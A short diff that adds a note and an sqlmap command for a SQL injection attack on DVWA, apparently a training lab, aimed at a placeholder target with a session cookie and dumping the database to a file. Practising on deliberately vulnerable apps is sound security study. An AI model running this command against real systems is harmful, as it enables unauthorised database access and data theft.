@@ -1,0 +1,4 @@
+# SQL Injection attack on DVWA
+sqlmap -u "http://TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="security=low; PHPSESSID=YOUR_SESSION_ID" \
+--batch --dump -o sqlmap_dump.txt
